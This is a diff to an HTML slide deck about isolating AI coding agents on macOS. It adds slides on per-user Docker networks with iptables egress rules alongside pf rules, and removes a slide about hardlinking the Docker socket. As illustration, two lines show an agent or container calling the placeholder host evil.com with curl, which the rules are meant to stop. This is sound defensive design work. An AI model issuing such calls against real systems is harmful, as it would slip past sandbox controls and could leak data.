@@ -1579,15 +1579,31 @@ section.lead p {
 <p>AI agents don't just write code — they <strong>build and test</strong> it.</p>
 <pre is="marp-pre" data-auto-scaling="downscale-only"><code class="language-bash">docker-compose up -d    <span class="hljs-comment"># start ClickHouse, Postgres, Redis</span>
 npm <span class="hljs-built_in">test</span>                <span class="hljs-comment"># integration tests hit real services</span>
-docker logs clickhouse  <span class="hljs-comment"># debug failing test</span>
 </code></pre>
-<p>This is not Docker-as-sandbox. This is Docker-as-dependency.</p>
-<p><strong>The Docker-in-Docker problem:</strong></p>
-<ul>
-<li>VM-based sandboxes can't easily nest Docker</li>
-<li>Docker socket access = root-equivalent privilege</li>
-<li>Giving an agent <code>/var/run/docker.sock</code> defeats isolation</li>
-</ul>
+<p><strong>The problem:</strong> Docker containers run inside a Linux VM, not as the sandboxed user.<br />
+macOS <code>pf</code> rules (by UID) don't apply. An agent can <code>docker run curl evil.com</code>.</p>
+<p><strong>Two-layer solution:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Layer</th>
+<th>Where</th>
+<th>Restricts</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>macOS <code>pf</code></td>
+<td>Host kernel</td>
+<td>Host processes (by UID)</td>
+</tr>
+<tr>
+<td>Docker <code>iptables</code></td>
+<td>OrbStack VM</td>
+<td>Container traffic (by subnet)</td>
+</tr>
+</tbody>
+</table>
 </section>
 </foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="16" data-paginate="true" data-background-color="#ffffff" data-color="#1d1d1f" data-theme="default" data-style="section {
   font-family: 'SF Pro Display', 'Helvetica Neue', sans-serif;
@@ -1676,17 +1692,20 @@ section.lead p {
   color: #86868b;
 }
 ;color:#1d1d1f;background-color:#ffffff;background-image:none;" data-marpit-pagination-total="18">
-<h2 id="isolator--docker-hardlink-the-socket">Isolator + Docker: Hardlink the Socket</h2>
-<p>OrbStack (or Docker Desktop) socket lives in <code>~/</code> — isolated users can't reach it.<br />
-<code>/var/run/docker.sock</code> is just a symlink there. Fix: <strong>replace symlink with hardlink</strong>.</p>
-<pre is="marp-pre" data-auto-scaling="downscale-only"><code class="language-bash"><span class="hljs-comment"># launchd watches and re-links when OrbStack restarts</span>
-target=$(<span class="hljs-built_in">readlink</span> /var/run/docker.sock)
-<span class="hljs-built_in">rm</span> /var/run/docker.sock
-<span class="hljs-built_in">ln</span> <span class="hljs-string">&quot;<span class="hljs-variable">$target</span>&quot;</span> /var/run/docker.sock
+<h2 id="docker-network-isolation">Docker Network Isolation</h2>
+<p>Per-user Docker networks with iptables egress rules inside the VM:</p>
+<pre is="marp-pre" data-auto-scaling="downscale-only"><code>iso-acm network (172.30.0.0/24)
+  ├── ACCEPT  container → container     <img class="emoji" draggable="false" alt="✅" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@17.0.2/assets/svg/2705.svg" data-marp-twemoji=""/> same subnet
+  ├── ACCEPT  container → DNS           <img class="emoji" draggable="false" alt="✅" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@17.0.2/assets/svg/2705.svg" data-marp-twemoji=""/> port 53
+  ├── ACCEPT  container → whitelisted   <img class="emoji" draggable="false" alt="✅" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@17.0.2/assets/svg/2705.svg" data-marp-twemoji=""/> from config.toml
+  └── DROP    container → *             <img class="emoji" draggable="false" alt="❌" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@17.0.2/assets/svg/274c.svg" data-marp-twemoji=""/> everything else
 </code></pre>
-<p>Standard <code>/var/run/docker.sock</code> path — no <code>DOCKER_HOST</code> needed.<br />
-Containers, testcontainers, ryuk — everything works with default paths.</p>
-<p><strong>Result:</strong> agents run <code>docker</code>, <code>docker-compose</code>, build images, start services — all from inside their sandbox. Zero overhead. No proxy. No VM nesting.</p>
+<p><code>docker pull</code> still works — it's a <strong>daemon</strong> operation, not container traffic.</p>
+<pre is="marp-pre" data-auto-scaling="downscale-only"><code class="language-bash">docker pull clickhouse/clickhouse-server   <span class="hljs-comment"># <img class="emoji" draggable="false" alt="✅" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@17.0.2/assets/svg/2705.svg" data-marp-twemoji=""/> daemon pulls</span>
+docker run --network=iso-acm clickhouse    <span class="hljs-comment"># <img class="emoji" draggable="false" alt="✅" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@17.0.2/assets/svg/2705.svg" data-marp-twemoji=""/> starts</span>
+<span class="hljs-comment"># container curl evil.com                  # <img class="emoji" draggable="false" alt="❌" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@17.0.2/assets/svg/274c.svg" data-marp-twemoji=""/> blocked by iptables</span>
+</code></pre>
+<p><code>iso pf</code> generates <strong>both</strong> macOS pf rules and Docker iptables rules from the same config.</p>
 </section>
 </foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="17" data-paginate="true" data-background-color="#ffffff" data-color="#1d1d1f" data-theme="default" data-style="section {
   font-family: 'SF Pro Display', 'Helvetica Neue', sans-serif;
